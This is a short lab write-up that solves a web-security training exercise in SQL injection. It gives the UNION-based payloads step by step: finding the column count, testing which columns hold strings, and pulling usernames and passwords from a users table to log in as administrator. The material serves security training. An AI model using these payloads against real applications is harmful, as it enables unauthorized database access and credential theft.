Difficulty : `Practitioner`

## ðŸŽ¯ Goal

The database contains a new table called `users` with columns `username` and `password` inside.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

## âœ… Solution

First we need to know how many columns are returned by the query:

````text
<website>/filter?category=Pets' UNION SELECT NULL--    # error!
<website>/filter?category=Pets' UNION SELECT NULL,NULL--    # works
<website>/filter?category=Pets' UNION SELECT NULL,NULL,NULL--    # error!
````

We now know there are 2 columns. Time to test if both contain string data:

````text
<website>/filter?category=Pets' UNION SELECT 'abc',NULL--    # works
<website>/filter?category=Pets' UNION SELECT 'abc','abc'--   # works
````

We are now sure both columns contain string. We can try to extract the data in users table:

````text
<website>/filter?category=Pets' UNION SELECT username, password FROM users--
````

The usernames and passwords are displayed.
